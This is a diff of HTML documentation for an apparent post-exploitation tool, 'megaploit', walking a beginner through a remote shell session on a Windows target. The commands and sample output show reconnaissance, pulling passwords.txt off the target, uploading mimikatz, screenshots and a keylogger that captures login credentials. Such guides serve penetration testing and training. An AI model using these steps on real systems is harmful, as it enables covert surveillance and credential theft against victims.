-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>megaploit &gt; interact session-1
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>[*] Switching to session session-1
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>[session-1] &gt;
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>megaploit &gt; interact session-1
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>[*] Switching to session session-1
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>[session-1] &gt;
 </span></code></pre></div>
 <p>You are now inside the remote shell. Everything you type runs on the target.</p>
 <hr />
 <h2 id="8-your-first-commands">8. Your First Commands<a class="headerlink" href="#8-your-first-commands" title="Permanent link">&para;</a></h2>
 <p>Once inside a session (<code>[session-1] &gt;</code>), here are the most useful commands to start with:</p>
 <h3 id="find-out-who-and-where-you-are">Find out who and where you are<a class="headerlink" href="#find-out-who-and-where-you-are" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Who am I on the target?</span>
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>whoami
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>DESKTOP-ABC<span class="se">\j</span>ohn
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a><span class="c1"># What directory am I in?</span>
-</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">pwd</span>
-</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn
-</span><span id="__span-25-8"><a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a>
-</span><span id="__span-25-9"><a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a><span class="c1"># What machine is this?</span>
-</span><span id="__span-25-10"><a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>sysinfo
-</span><span id="__span-25-11"><a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>Hostname:<span class="w">  </span>DESKTOP-ABC
-</span><span id="__span-25-12"><a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>OS:<span class="w">        </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>Pro<span class="w"> </span>Build<span class="w"> </span><span class="m">19045</span>
-</span><span id="__span-25-13"><a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>Arch:<span class="w">      </span>x64
-</span><span id="__span-25-14"><a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>User:<span class="w">      </span>john
-</span><span id="__span-25-15"><a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>Domain:<span class="w">    </span>WORKGROUP
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Who am I on the target?</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>whoami
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>DESKTOP-ABC<span class="se">\j</span>ohn
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="c1"># What directory am I in?</span>
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">pwd</span>
+</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn
+</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a>
+</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="c1"># What machine is this?</span>
+</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>sysinfo
+</span><span id="__span-27-11"><a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>Hostname:<span class="w">  </span>DESKTOP-ABC
+</span><span id="__span-27-12"><a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>OS:<span class="w">        </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>Pro<span class="w"> </span>Build<span class="w"> </span><span class="m">19045</span>
+</span><span id="__span-27-13"><a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a>Arch:<span class="w">      </span>x64
+</span><span id="__span-27-14"><a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>User:<span class="w">      </span>john
+</span><span id="__span-27-15"><a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a>Domain:<span class="w">    </span>WORKGROUP
 </span></code></pre></div>
 <h3 id="look-around-the-filesystem">Look around the filesystem<a class="headerlink" href="#look-around-the-filesystem" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># List files in current directory</span>
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>ls
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="w"> </span>Directory:<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn
-</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
-</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>Mode<span class="w">    </span>Name
-</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>----<span class="w">    </span>----
-</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>d<span class="w">       </span>Desktop
-</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>d<span class="w">       </span>Documents
-</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>d<span class="w">       </span>Downloads
-</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>-<span class="w">       </span>NTUSER.DAT
-</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
-</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a><span class="c1"># Change directory</span>
-</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>Desktop
-</span><span id="__span-26-14"><a id="__codelineno-26-14" name="__codelineno-26-14" href="#__codelineno-26-14"></a>
-</span><span id="__span-26-15"><a id="__codelineno-26-15" name="__codelineno-26-15" href="#__codelineno-26-15"></a><span class="c1"># Print a file</span>
-</span><span id="__span-26-16"><a id="__codelineno-26-16" name="__codelineno-26-16" href="#__codelineno-26-16"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w"> </span>secret.txt
-</span><span id="__span-26-17"><a id="__codelineno-26-17" name="__codelineno-26-17" href="#__codelineno-26-17"></a>Password:<span class="w"> </span>SuperSecret123
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># List files in current directory</span>
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>ls
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w"> </span>Directory:<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>Mode<span class="w">    </span>Name
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>----<span class="w">    </span>----
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>d<span class="w">       </span>Desktop
+</span><span id="__span-28-8"><a id="__codelineno-28-8" name="__codelineno-28-8" href="#__codelineno-28-8"></a>d<span class="w">       </span>Documents
+</span><span id="__span-28-9"><a id="__codelineno-28-9" name="__codelineno-28-9" href="#__codelineno-28-9"></a>d<span class="w">       </span>Downloads
+</span><span id="__span-28-10"><a id="__codelineno-28-10" name="__codelineno-28-10" href="#__codelineno-28-10"></a>-<span class="w">       </span>NTUSER.DAT
+</span><span id="__span-28-11"><a id="__codelineno-28-11" name="__codelineno-28-11" href="#__codelineno-28-11"></a>
+</span><span id="__span-28-12"><a id="__codelineno-28-12" name="__codelineno-28-12" href="#__codelineno-28-12"></a><span class="c1"># Change directory</span>
+</span><span id="__span-28-13"><a id="__codelineno-28-13" name="__codelineno-28-13" href="#__codelineno-28-13"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>Desktop
+</span><span id="__span-28-14"><a id="__codelineno-28-14" name="__codelineno-28-14" href="#__codelineno-28-14"></a>
+</span><span id="__span-28-15"><a id="__codelineno-28-15" name="__codelineno-28-15" href="#__codelineno-28-15"></a><span class="c1"># Print a file</span>
+</span><span id="__span-28-16"><a id="__codelineno-28-16" name="__codelineno-28-16" href="#__codelineno-28-16"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>cat<span class="w"> </span>secret.txt
+</span><span id="__span-28-17"><a id="__codelineno-28-17" name="__codelineno-28-17" href="#__codelineno-28-17"></a>Password:<span class="w"> </span>SuperSecret123
 </span></code></pre></div>
 <h3 id="run-a-shell-command">Run a shell command<a class="headerlink" href="#run-a-shell-command" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Run any Windows command</span>
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w"> </span>ipconfig
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>Windows<span class="w"> </span>IP<span class="w"> </span>Configuration
-</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>Ethernet<span class="w"> </span>adapter<span class="w"> </span>Ethernet:
-</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="w">   </span>IPv4<span class="w"> </span>Address:<span class="w"> </span><span class="m">192</span>.168.1.100
-</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a><span class="w">   </span>Subnet<span class="w"> </span>Mask:<span class="w">  </span><span class="m">255</span>.255.255.0
-</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>
-</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="c1"># Run a PowerShell command</span>
-</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>powershell<span class="w"> </span>Get-Process<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select-Object<span class="w"> </span>-First<span class="w"> </span><span class="m">5</span>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Run any Windows command</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>shell<span class="w"> </span>ipconfig
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>Windows<span class="w"> </span>IP<span class="w"> </span>Configuration
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>Ethernet<span class="w"> </span>adapter<span class="w"> </span>Ethernet:
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="w">   </span>IPv4<span class="w"> </span>Address:<span class="w"> </span><span class="m">192</span>.168.1.100
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="w">   </span>Subnet<span class="w"> </span>Mask:<span class="w">  </span><span class="m">255</span>.255.255.0
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="c1"># Run a PowerShell command</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>powershell<span class="w"> </span>Get-Process<span class="w"> </span><span class="p">|</span><span class="w"> </span>Select-Object<span class="w"> </span>-First<span class="w"> </span><span class="m">5</span>
 </span></code></pre></div>
 <h3 id="upload-and-download-files">Upload and download files<a class="headerlink" href="#upload-and-download-files" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Download a file FROM the target TO your machine</span>
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\p</span>asswords.txt
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Downloaded:<span class="w"> </span>passwords.txt<span class="w"> </span><span class="o">(</span><span class="m">1</span>.2<span class="w"> </span>KB<span class="o">)</span>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="c1"># Upload a file FROM your machine TO the target</span>
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>/root/tools/mimikatz.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\m</span>.exe
-</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Uploaded:<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\m</span>.exe
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1"># Download a file FROM the target TO your machine</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>download<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\p</span>asswords.txt
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Downloaded:<span class="w"> </span>passwords.txt<span class="w"> </span><span class="o">(</span><span class="m">1</span>.2<span class="w"> </span>KB<span class="o">)</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="c1"># Upload a file FROM your machine TO the target</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>upload<span class="w"> </span>/root/tools/mimikatz.exe<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\m</span>.exe
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Uploaded:<span class="w"> </span>C:<span class="se">\T</span>emp<span class="se">\m</span>.exe
 </span></code></pre></div>
 <h3 id="take-a-screenshot">Take a screenshot<a class="headerlink" href="#take-a-screenshot" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>screenshot
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Screenshot<span class="w"> </span>saved:<span class="w"> </span>screenshot_20240115_143022.png
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>screenshot
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Screenshot<span class="w"> </span>saved:<span class="w"> </span>screenshot_20240115_143022.png
 </span></code></pre></div>
 <h3 id="start-a-keylogger">Start a keylogger<a class="headerlink" href="#start-a-keylogger" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1"># Start recording keystrokes</span>
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>keyscan_start
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Keylogger<span class="w"> </span>started
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="c1"># ... wait a minute while the user types ...</span>
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="c1"># Dump what was captured</span>
-</span><span id="__span-30-8"><a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>keyscan_dump
-</span><span id="__span-30-9"><a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a><span class="o">[</span>FIREFOX<span class="o">]</span><span class="w"> </span>john@gmail.com<span class="w">  </span>MyPassword456
-</span><span id="__span-30-10"><a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a><span class="o">[</span>NOTEPAD<span class="o">]</span><span class="w"> </span>Meeting<span class="w"> </span>notes<span class="w"> </span><span class="k">for</span><span class="w"> </span>...
-</span><span id="__span-30-11"><a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>
-</span><span id="__span-30-12"><a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a><span class="c1"># Stop the keylogger</span>
-</span><span id="__span-30-13"><a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>keyscan_stop
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># Start recording keystrokes</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>keyscan_start
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Keylogger<span class="w"> </span>started
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="c1"># ... wait a minute while the user types ...</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c1"># Dump what was captured</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>keyscan_dump
+</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="o">[</span>FIREFOX<span class="o">]</span><span class="w"> </span>john@gmail.com<span class="w">  </span>MyPassword456
+</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="o">[</span>NOTEPAD<span class="o">]</span><span class="w"> </span>Meeting<span class="w"> </span>notes<span class="w"> </span><span class="k">for</span><span class="w"> </span>...
+</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a>
+</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a><span class="c1"># Stop the keylogger</span>
+</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>keyscan_stop
 </span></code></pre></div>
 <h3 id="background-the-session-and-return-to-the-main-menu">Background the session and return to the main menu<a class="headerlink" href="#background-the-session-and-return-to-the-main-menu" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1"># Background this session (it stays alive)</span>
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>background
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>megaploit<span class="w"> </span>&gt;
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="c1"># Come back to it later</span>
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>interact<span class="w"> </span>session-1
-</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Background this session (it stays alive)</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>background
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>megaploit<span class="w"> </span>&gt;
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="c1"># Come back to it later</span>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>megaploit<span class="w"> </span>&gt;<span class="w"> </span>interact<span class="w"> </span>session-1
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;
 </span></code></pre></div>
 <hr />
 <h2 id="9-save-your-work">9. Save Your Work<a class="headerlink" href="#9-save-your-work" title="Permanent link">&para;</a></h2>
 <h3 id="save-the-session-log-to-a-file">Save the session log to a file<a class="headerlink" href="#save-the-session-log-to-a-file" title="Permanent link">&para;</a></h3>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>log<span class="w"> </span>save<span class="w"> </span>/root/engagement/session1.log
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Log<span class="w"> </span>saved
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="o">[</span>session-1<span class="o">]</span><span class="w"> </span>&gt;<span class="w"> </span>log<span class="w"> </span>save<span class="w"> </span>/root/engagement/session1.log
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Log<span class="w"> </span>saved
 </span></code></pre></div>
 <h3 id="export-session-info-to-the-database">Export session info to the database<a class="headerlink" href="#export-session-info-to-the-database" title="Permanent link">&para;</a></h3>
 <p>Megaploit automatically logs all commands and output to its built-in database. To query it:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>megaploit &gt; db_status
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>[*] Database: connected (megaploit.db)
